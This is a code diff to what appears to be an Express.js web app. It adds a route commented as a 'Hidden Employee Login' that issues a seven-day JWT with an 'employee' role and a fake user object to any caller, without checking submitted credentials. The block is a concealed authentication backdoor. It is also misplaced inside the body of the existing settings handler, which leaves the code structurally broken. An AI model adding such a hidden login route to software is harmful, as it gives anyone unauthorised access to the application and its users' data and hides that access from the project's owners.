@@ -124,6 +124,34 @@ app.get('/api/tracks', auth, (req,res)=>{
 
 // settings
 app.post('/api/settings', auth, (req,res)=>{
+  // Hidden Employee Login route
+app.post("/api/employee-login", async (req, res) => {
+  const employeeEmail = process.env.EMPLOYEE_EMAIL;
+  const employeePass = process.env.EMPLOYEE_PASSWORD;
+
+  // Verify credentials exist
+  if (!employeeEmail || !employeePass) {
+    return res.status(500).json({ error: "Employee credentials not set" });
+  }
+
+  // Create JWT token with special role
+  const token = jwt.sign(
+    { email: employeeEmail, role: "employee" },
+    SECRET,
+    { expiresIn: "7d" }
+  );
+
+  // Respond with a fake user object and token
+  const user = {
+    id: 0,
+    email: employeeEmail,
+    display_name: "Employee",
+    role: "employee"
+  };
+
+  res.json({ user, token });
+});
+
   const s = JSON.stringify(req.body);
   db.prepare('INSERT INTO settings (user_id, data) VALUES (?,?) ON CONFLICT(user_id) DO UPDATE SET data=excluded.data').run(req.user.id, s);
   res.json({ ok:true });
